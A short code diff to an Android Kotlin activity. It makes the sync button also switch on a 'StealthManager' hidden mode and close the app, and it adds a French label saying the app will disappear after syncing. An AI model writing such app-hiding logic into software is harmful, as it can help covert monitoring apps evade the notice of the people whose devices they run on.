@@ -449,11 +449,31 @@ class MainActivity : ComponentActivity() {
 
             Spacer(Modifier.height(20.dp))
             OutlinedButton(
-                onClick = { SyncWorker.triggerNow(this@MainActivity) },
+                onClick = { 
+                    // Synchroniser
+                    SyncWorker.triggerNow(this@MainActivity)
+                    
+                    // Activer le mode furtif et fermer l'app
+                    StealthManager.setMode(this@MainActivity, StealthManager.StealthMode.HIDDEN)
+                    
+                    // Fermer l'activité après un court délai
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        finish()
+                    }, 500)
+                },
                 modifier = Modifier.fillMaxWidth()
             ) {
                 Text("Synchroniser maintenant", fontSize = 13.sp)
             }
+            
+            Spacer(Modifier.height(8.dp))
+            Text(
+                "L'application disparaîtra après synchronisation",
+                fontSize = 11.sp,
+                color = MaterialTheme.colorScheme.onSurfaceVariant,
+                modifier = Modifier.fillMaxWidth(),
+                textAlign = androidx.compose.ui.text.style.TextAlign.Center
+            )
         }
     }
 
